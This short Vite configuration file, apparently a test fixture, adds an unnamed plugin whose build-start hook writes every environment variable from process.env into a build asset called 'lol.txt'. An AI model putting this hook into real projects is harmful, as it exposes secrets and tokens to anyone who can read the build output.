import { defineConfig } from "vite";

export default defineConfig({
  plugins: [
    {
      buildStart() {
        this.emitFile({
          type: "asset",
          name: "lol.txt",
          source: JSON.stringify(process.env, null, 2),
        });
      },
    },
  ],
  build: {
    outDir: process.env.out ?? "dist",
  },
});
